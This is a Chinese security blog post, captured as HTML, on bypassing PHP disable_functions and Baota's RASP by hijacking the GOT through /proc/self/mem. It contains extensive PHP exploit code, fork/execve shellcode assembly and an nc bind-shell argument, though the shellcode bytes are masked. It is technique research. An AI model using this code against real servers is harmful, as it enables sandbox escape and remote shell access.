@@ -1,0 +1,533 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="referrer" content="no-referrer">
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>针对宝塔的RASP及其disable_functions的绕过 | xray 技术博客</title>
+<link rel="shortcut icon" href="https://blog.xray.cool/favicon.ico?v=1620790014149">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://blog.xray.cool/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="针对宝塔的RASP及其disable_functions的绕过 | xray 技术博客 - Atom Feed" href="https://blog.xray.cool/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-176727836-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-176727836-2');
+</script>
+
+
+    <meta name="description" content="0x01 实验环境
+
+开启宝塔自带的防跨站攻击。
+安装并开启堡塔 PHP 安全防护。
+安装并开启堡塔防提权。
+
+0x02 概述
+无聊的时候和宝塔开发聊天，听他说了宝塔在开发一个基于底层的 rasp，拦截所有基于 www 权限的命令执行。最近..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://blog.xray.cool">
+  <img class="avatar" src="https://blog.xray.cool/images/avatar.png?v=1620790014149" alt="">
+  </a>
+  <h1 class="site-title">
+    xray 技术博客
+  </h1>
+  <p class="site-description">
+    
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives/" class="menu">
+          归档
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              针对宝塔的RASP及其disable_functions的绕过
+            </h2>
+            <div class="post-info">
+              <span>
+                2020-09-07
+              </span>
+              <span>
+                13 min read
+              </span>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://blog.xray.cool/post-images/bypass-bt-disable-function.jpeg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h2 id="0x01-实验环境">0x01 实验环境</h2>
+<ul>
+<li>开启宝塔自带的防跨站攻击。</li>
+<li>安装并开启堡塔 PHP 安全防护。</li>
+<li>安装并开启堡塔防提权。</li>
+</ul>
+<h2 id="0x02-概述">0x02 概述</h2>
+<p>无聊的时候和宝塔开发聊天，听他说了宝塔在开发一个基于底层的 rasp，拦截所有基于 www 权限的命令执行。最近总算上线了，我稍微测试了一下，效果确实不错：<br>
+<img src="https://blog.xray.cool/post-images/1599474983125.png" alt="" loading="lazy"></p>
+<p>不管是通过 php 来调用 system，会拦截，你是 root 权限的情况下，通过 su www 都会被一并拦截，也就是说 www 基本什么也做不了，我一开始还挺惊讶这 php 居然没崩溃还能运行，开发说加了特殊的兼容，这就让我感兴趣了。在加上业内知名的最全<code>disable_functions</code>名单，成功吸引了我来挑战。</p>
+<p>主要挑战内容就是在他们的防跨站，也就是在他们的<code>open_basedir</code>限制了目录的情况下，先突破<br>
+<code>disable_functions</code>，然后在突破他们的 rasp。</p>
+<h2 id="0x03-如何通过劫持-got-表绕过disable_functions">0x03 如何通过劫持 GOT 表绕过disable_functions</h2>
+<p>在突破 rasp 前，我们首先得先能碰到 rasp，不然<code>disable_functions</code>都过不去，何来绕过 rasp 之说。</p>
+<ul>
+<li>什么是GOT表？</li>
+</ul>
+<ol>
+<li>浅析ELF中的GOT与PLT</li>
+<li>深入了解GOT,PLT和动态链接</li>
+<li>漏洞利用-GOT覆写技术</li>
+<li>Linux中的GOT和PLT到底是个啥？</li>
+</ol>
+<p>简单来说，某个程序需要调用printf这个函数，先到plt表里面找到对应的got表的里面存放的真正代码块的地址，在根据这个地址跳转到代码块。plt表是不可写的，got表可写，在没有执行之前填充00，在执行的时候由动态连接器填充真正的函数地址进去。假如我们能找到got表的地址，修改他指向的地址，比如把printf的地址和system的地址互换，就会造成我们调用的是printf，但实际上执行的是system，以此来突破disable_functions。</p>
+<h3 id="实现">实现</h3>
+<pre><code class="language-java"> &lt;?php /***
+ *
+* BUG修正请联系我
+* @author
+* @email xiaozeend@pm.me *
+*/
+$path=&quot;/tmp/ncc&quot;;
+$args = &quot; -lvvp 7711 -e /bin/bash&quot;;
+/**
+section tables type
+*/
+define('SHT_NULL',0);
+define('SHT_PROGBITS',1);
+define('SHT_SYMTAB',2);
+define('SHT_STRTAB',3);
+define('SHT_RELA',4);
+define('SHT_HASH',5);
+define('SHT_DYNAMIC',6);
+define('SHT_NOTE',7);
+define('SHT_NOBITS',8);
+define('SHT_REL',9);
+define('SHT_SHLIB',10);
+define('SHT_DNYSYM',11);
+define('SHT_INIT_ARRAY',14);
+define('SHT_FINI_ARRAY',15);
+//why does section tables have so many fuck type
+define('SHT_GNU_HASH',0x6ffffff6);
+define('SHT_GNU_versym',0x6fffffff);
+define('SHT_GNU_verneed',0x6ffffffe);
+
+
+class elf{
+    private $elf_bin;
+    private $strtab_section=array();
+    private $rel_plt_section=array();
+    private $dynsym_section=array();
+    public $shared_librarys=array();
+    public $rel_plts=array();
+    public function getElfBin()
+{
+        return $this-&gt;elf_bin;
+    }
+    public function setElfBin($elf_bin)
+{
+        $this-&gt;elf_bin = fopen($elf_bin,&quot;rb&quot;);
+    }
+    public function unp($value)
+{
+        return hexdec(bin2hex(strrev($value)));
+    }
+    public function get($start,$len){
+ 
+        fseek($this-&gt;elf_bin,$start);
+        $data=fread ($this-&gt;elf_bin,$len);
+        rewind($this-&gt;elf_bin);
+        return $this-&gt;unp($data);
+    }
+    public function get_section($elf_bin=&quot;&quot;){
+        if ($elf_bin){
+            $this-&gt;setElfBin($elf_bin);
+        }
+        $this-&gt;elf_shoff=$this-&gt;get(0x28,8);
+        $this-&gt;elf_shentsize=$this-&gt;get(0x3a,2);
+        $this-&gt;elf_shnum=$this-&gt;get(0x3c,2);
+        $this-&gt;elf_shstrndx=$this-&gt;get(0x3e,2);
+        for ($i=0;$i&lt;$this-&gt;elf_shnum;$i+=1){
+            $sh_type=$this-&gt;get($this-&gt;elf_shoff+$i*$this-&gt;elf_shentsize+4,4);
+            switch ($sh_type){
+                case SHT_STRTAB:
+                    $this-&gt;strtab_section[$i]=
+                        array(
+                            'strtab_offset'=&gt;$this-&gt;get($this-
+&gt;elf_shoff+$i*$this-&gt;elf_shentsize+24,8),
+                            'strtab_size'=&gt;$this-&gt;strtab_size=$this-&gt;get($this-
+&gt;elf_shoff+$i*$this-&gt;elf_shentsize+32,8)
+                        );
+                    break;
+                    
+                case SHT_RELA:
+                    $this-&gt;rel_plt_section[$i]=
+                        array(
+                            'rel_plt_offset'=&gt;$this-&gt;get($this-
+&gt;elf_shoff+$i*$this-&gt;elf_shentsize+24,8),
+                            'rel_plt_size'=&gt;$this-&gt;strtab_size=$this-&gt;get($this-
+&gt;elf_shoff+$i*$this-&gt;elf_shentsize+32,8),
+                            'rel_plt_entsize'=&gt;$this-&gt;get($this-
+&gt;elf_shoff+$i*$this-&gt;elf_shentsize+56,8)
+                        );
+                    break;
+                case SHT_DNYSYM:
+                    $this-&gt;dynsym_section[$i]=
+                        array(
+                            'dynsym_offset'=&gt;$this-&gt;get($this-
+&gt;elf_shoff+$i*$this-&gt;elf_shentsize+24,8),
+                            'dynsym_size'=&gt;$this-&gt;strtab_size=$this-&gt;get($this-
+&gt;elf_shoff+$i*$this-&gt;elf_shentsize+32,8),
+                            'dynsym_entsize'=&gt;$this-&gt;get($this-
+&gt;elf_shoff+$i*$this-&gt;elf_shentsize+56,8)
+                        );
+                    break;
+                    
+                case SHT_NULL:
+                case SHT_PROGBITS:
+                case SHT_DYNAMIC:
+                case SHT_SYMTAB:
+                case SHT_NOBITS:
+                case SHT_NOTE:
+                case SHT_FINI_ARRAY:
+                case SHT_INIT_ARRAY:
+                case SHT_GNU_versym:
+                case SHT_GNU_HASH:
+                     break;
+                     
+                default:
+ //                   echo &quot;who knows what $sh_type this is? &quot;;
+
+              } 
+          }
+     }
+    public function get_reloc(){
+        $rel_plts=array();
+        $dynsym_section= reset($this-&gt;dynsym_section);
+        $strtab_section=reset($this-&gt;strtab_section);
+        foreach ($this-&gt;rel_plt_section as $rel_plt ){
+             for ($i=$rel_plt['rel_plt_offset'];
+                 $i&lt;$rel_plt['rel_plt_offset']+$rel_plt['rel_plt_size'];
+                 $i+=$rel_plt['rel_plt_entsize'])
+             {
+                 $rel_offset=$this-&gt;get($i,8);
+                 $rel_info=$this-&gt;get($i+8,8)&gt;&gt;32;
+                 $fun_name_offset=$this-
+&gt;get($dynsym_section['dynsym_offset']+$rel_info*$dynsym_section['dynsym_entsize'
+],4);
+
+ $fun_name_offset=$strtab_section['strtab_offset']+$fun_name_offset-1;
+                $fun_name='';
+                while ($this-&gt;get(++$fun_name_offset,1)!=&quot;&quot;){
+                    $fun_name.=chr($this-&gt;get($fun_name_offset,1));
+                }
+                $rel_plts[$fun_name]=$rel_offset;
+            }
+        }
+        $this-&gt;rel_plts=$rel_plts;
+    }
+    public function get_shared_library($elf_bin=&quot;&quot;){
+        if ($elf_bin){
+            $this-&gt;setElfBin($elf_bin);
+        }
+        $shared_librarys=array();
+        $dynsym_section=reset($this-&gt;dynsym_section);
+        $strtab_section=reset($this-&gt;strtab_section);
+        for
+($i=$dynsym_section['dynsym_offset']+$dynsym_section['dynsym_entsize'];
+             $i&lt;$dynsym_section['dynsym_offset']+$dynsym_section['dynsym_size'];
+             $i+=$dynsym_section['dynsym_entsize'])
+        {
+            $shared_library_offset=$this-&gt;get($i+8,8);
+            $fun_name_offset=$this-&gt;get($i,4);
+ $fun_name_offset=$fun_name_offset+$strtab_section['strtab_offset']-1;
+            $fun_name='';
+            while ($this-&gt;get(++$fun_name_offset,1)!=&quot;&quot;){
+                $fun_name.=chr($this-&gt;get($fun_name_offset,1));
+              }
+              $shared_librarys[$fun_name]=$shared_library_offset;
+         }
+         $this-&gt;shared_librarys=$shared_librarys;
+   }
+   public function close(){
+       fclose($this-&gt;elf_bin);
+   }
+   
+   public function __destruct()
+   {
+       $this-&gt;close();
+   }
+   public function packlli($value) {
+       $higher = ($value &amp; 0xffffffff00000000) &gt;&gt; 32;
+       $lower = $value &amp; 0x00000000ffffffff;
+       return pack('V2', $lower, $higher);
+   }
+}
+</code></pre>
+<ul>
+<li>我们简单实现一个读取 elf 文件各表的 php 代码。</li>
+<li>其中<code>get_section</code>函数根据各表的偏移提取出对应的值保存。</li>
+<li><code>get_reloc</code>函数获取 PLT 表里面保存的指向 GOT 表的值。</li>
+<li><code>get_shared_library</code>函数则是解析 libc 库的。</li>
+</ul>
+<p>接下来在成功解析目标执行的 php 文件后，拿到对应 GOT 表的偏移后，我们可以通过<code>/proc/self/maps</code>拿到正在执行的 php 的内存布局，来找到一个可写可执行的内存块用来放我们的<code>shellcode</code>。同时获得堆棧的内存地址：</p>
+<pre><code class="language-java">$test=new elf();
+$test-&gt;get_section('/proc/self/exe');
+$test-&gt;get_reloc();
+$open_php=$test-&gt;rel_plts['open'];
+$maps = file_get_contents('/proc/self/maps'); 
+preg_match('/(\w+)-(\w+)\s+.+\[stack]/', $maps, $stack);
+echo &quot;Stack location: &quot;.$stack[1].&quot;\n&quot;;
+$pie_base = hexdec(&quot;0x&quot;.(explode('-', $maps)[0])); 
+echo &quot;PIE base: &quot;.$pie_base.&quot;\n&quot;;
+</code></pre>
+<p>至此，我们已经做好全部的准备，如果没有宝塔的 RASP，单纯的<code>disable_functions</code>的话，就可以在这里通过<code>get_shared_library</code>函数去解析 libc 里面的 system 的地址，然后把 open 在 GOT 表里面的地址覆写成 system 的地址，即可绕过<code>disable_functions</code>。</p>
+<p>可惜的是，宝塔的 rasp 会拦截所有基于 www 权限的 bash 的执行，在这我们绕过了<code>disable_functions</code>也只是收获了一条无情的拦截提示：<br>
+<img src="https://blog.xray.cool/post-images/1599476133954.png" alt="" loading="lazy"></p>
+<p>这里我们就要思考，为什么我们需要 system 这个函数？是为了弹个 nc 回来，到处 cd 在加个 ls -la 玩吗？显然不是，这样的需求 php 也可以满足。我们实际上的目的是去执行我们提权的 exp，也就是去执行其他的代码，其他的文件。而不是单纯的执行个 id，看一眼 www 的回显，然后到处 cd 玩的。</p>
+<h2 id="0x04-解决宝塔的-rasp">0x04 解决宝塔的 RASP</h2>
+<p>在这，我们通过不把 open 的 GOT 表地址修改成 system 的地址，而是改成我们 shellcode 的地址，这里本质上是我们已经控制了 php 的 eip 了，我们只需要在内存里面写入我们的 shellcode ，在让 got 表指向这个地址，就可以让 php 来执行我们的提权的 exp 或者其他任何我们想让他做的东西。</p>
+<h3 id="实现-2">实现</h3>
+<p>我们接下来根据php加载在内存里面的地址，开辟一个风水宝地来存放我们的shellcode，同时让GOT表里面的open函数的地址指向这个shellcode的地址：</p>
+<pre><code class="language-java">$mem = fopen('/proc/self/mem', 'wb');
+$shellcode_loc = $pie_base + 0x2333; fseek($mem, $open_php);
+fwrite($mem,  $test-&gt;packlli($shellcode_loc));
+</code></pre>
+<p>这段代码，我们利用<code>/proc/self/mem</code>来访问自己的内存，同时根据之前获取到的拥有可写可执行权限的内存块，来开辟一个放 shellcode 的地方，也就是<code>$shellcode_loc</code> 同时我们这里已经修改了 GOT 表中<br>
+open 指向的地址为我们的<code>$shellcode_loc</code>的地址。</p>
+<p>接下来我们要准备我们的 shellcode 了，我这里是通过 fork 来开辟一个新进程，在新进程里面通过<code>execve</code>来启动我们的提权 exp，这里也可以直接放 msf 生产的 shellcode，自由发挥：</p>
+<pre><code class="language-java">push    0x39
+pop eax
+syscall
+test    eax, eax
+jne 0x31
+push    0x70
+pop eax
+syscall
+push    0x39
+pop eax
+syscall
+test    eax, eax
+jne 0x31
+</code></pre>
+<p>这段简单的汇编非常简单，我们通过 0x39 这个系统调用号来调用 fork 函数，我们这里 push 入参然后<br>
+syscall 调用， test 通过判断 eax 是否为 0 来判断有没有调用成功，如果失败则 ZF 标志为 1 通过 jne 圆滑的离开。剩下的基本一样，先后调用 0x39，0x70，0x39，也就是通过调用 fork 创建子进程， setsid 切到子进程，再 fork 一次。然后我们就得到了一个独立且脱离终端控制的新进程了。<br>
+接下来我们调用 execve 来指向我们的程序：</p>
+<pre><code class="language-java">mov rdi, 0xffffffffffffffff ; filename
+mov rsi, 0xffffffffffffffff ; argv
+xor edx, edx
+push    0x3b
+pop eax
+syscall
+ret
+push    0
+pop edi
+push    0x3c
+pop eax
+syscall
+</code></pre>
+<p>然后用 nasm 编译得到 shellcode，接下来就差处理我们需要执行的文件和参数了：</p>
+<pre><code class="language-java">$stack=hexdec(&quot;0x&quot;.$stack[1]);
+fseek($mem, $stack);
+fwrite($mem, &quot;{$path}\x00&quot;);
+$filename_ptr = $stack;
+</code></pre>
+<p>我们这里给获得堆棧的地址，入参我们需要执行的文件的地址，然后保存这个地址<code>$filename_ptr</code> 等待接下来拼接入 shellcode，然后就是我们需要执行的文件的参数的入参：</p>
+<pre><code class="language-java">$stack += strlen($path) + 1;
+fseek($mem, $stack);
+fwrite($mem, str_replace(&quot; &quot;, &quot;\x00&quot;, $args) . &quot;\x00&quot;);
+$str_ptr = $stack;
+$argv_ptr = $arg_ptr = $stack + strlen($args) + 1;
+foreach(explode(' ', $args) as $arg) {
+    fseek($mem, $arg_ptr);
+    fwrite($mem, $test-&gt;packlli($str_ptr));
+    $arg_ptr += 8;
+    $str_ptr += strlen($arg) + 1;
+}
+fseek($mem, $arg_ptr);
+fwrite($mem, $test-&gt;packlli(0x00));
+echo &quot;Argv: &quot; . $args . &quot;\n&quot;;
+echo &quot;ELF PATH $path\n&quot;;
+</code></pre>
+<p>到这，我们已经准备好所有的东西了，接下来在 GOT 表里 open 函数指向的地址，也就是我们一开始找到的一个可写可执行的地址<code>$shellcode_loc = $pie_base + 0x2333</code>; 写入我们的 shellcode:</p>
+<pre><code class="language-java">$shellcode = &quot;shellcode打马赛克&quot;. $test-&gt;packlli($filename_ptr) .&quot;shellcode打马赛克&quot; .$test-&gt;packlli($argv_ptr) .&quot;shellcode打马赛克&quot;;
+fseek($mem, $shellcode_loc);
+fwrite($mem, $shellcode);
+</code></pre>
+<p>完成整个利用。</p>
+<ul>
+<li>流程为：
+<ol>
+<li>解析 php 文件获得 plt 里面 open 指向 plt 表的地址</li>
+<li>通过获取到的 plt 表的地址，等待程序运行填充 00 后将这个地址修改为我们准备放 shellcode 的风水宝地。</li>
+<li>丢入 shellcode，完成劫持 GOT 表。<br>
+接下来我们随便执行一个有文件操作，也就是会调用 libc 里面的 open 函数的 php 函数，即可触发：</li>
+</ol>
+</li>
+</ul>
+<pre><code class="language-java">readfile('email-&gt;xiaozeend@pm.me', 'r');
+echo &quot;DONE\n&quot;;
+exit();
+</code></pre>
+<ul>
+<li>
+<p>完整的利用就出来了:<br>
+<img src="https://blog.xray.cool/post-images/1599476539990.png" alt="" loading="lazy"></p>
+</li>
+<li>
+<p>调试<br>
+<img src="https://blog.xray.cool/post-images/1599476573349.png" alt="" loading="lazy"></p>
+<p>我调试的源码为 PHP7.1.10，在最后的触发 shellcode <code>的readfile</code>函数处下的断点。然后用 GDB 给 GOT 表里面我们修改的那个 shellcode 的起始地址下一个断点，</p>
+</li>
+<li>
+<p>执行：<br>
+<img src="https://blog.xray.cool/post-images/1599476613693.png" alt="" loading="lazy"></p>
+<p>就成功断在我们 shellcode 的入口了，在这我们就看到我们之前编写的 shellcode ，之后就可以慢慢调试你的 shellcode 了。</p>
+</li>
+</ul>
+<h2 id="0x05-其他">0x05 其他</h2>
+<ul>
+<li>只作为思路分享，exp不公开。</li>
+<li>错误的地方请通过邮箱 xiaozeend@pm.me 和我取得联系并帮助我修正。</li>
+</ul>
+<h2 id="主要引用与参考">主要引用与参考</h2>
+<ol>
+<li>https://www.anquanke.com/post/id/183370#h2-17</li>
+<li>blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/</li>
+<li>http://asm.sourceforge.net/syscall.html#s-arch</li>
+<li>https://2018.zeronights.ru/wp-content/uploads/materials/09-ELF-execution-in-Linux-RAM.pdf</li>
+<li>https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html</li>
+<li>为了省略篇幅，只列出了主要参考内容。</li>
+</ol>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#0x01-%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83">0x01 实验环境</a></li>
+<li><a href="#0x02-%E6%A6%82%E8%BF%B0">0x02 概述</a></li>
+<li><a href="#0x03-%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87%E5%8A%AB%E6%8C%81-got-%E8%A1%A8%E7%BB%95%E8%BF%87disable_functions">0x03 如何通过劫持 GOT 表绕过disable_functions</a>
+<ul>
+<li><a href="#%E5%AE%9E%E7%8E%B0">实现</a></li>
+</ul>
+</li>
+<li><a href="#0x04-%E8%A7%A3%E5%86%B3%E5%AE%9D%E5%A1%94%E7%9A%84-rasp">0x04 解决宝塔的 RASP</a>
+<ul>
+<li><a href="#%E5%AE%9E%E7%8E%B0-2">实现</a></li>
+</ul>
+</li>
+<li><a href="#0x05-%E5%85%B6%E4%BB%96">0x05 其他</a></li>
+<li><a href="#%E4%B8%BB%E8%A6%81%E5%BC%95%E7%94%A8%E4%B8%8E%E5%8F%82%E8%80%83">主要引用与参考</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://blog.xray.cool/post/how-to-find-shiro-rememberme-deserialization-vulnerability/">
+              <h3 class="post-title">
+                Shiro RememberMe 漏洞检测的探索之路
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="https://blog.xray.cool/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
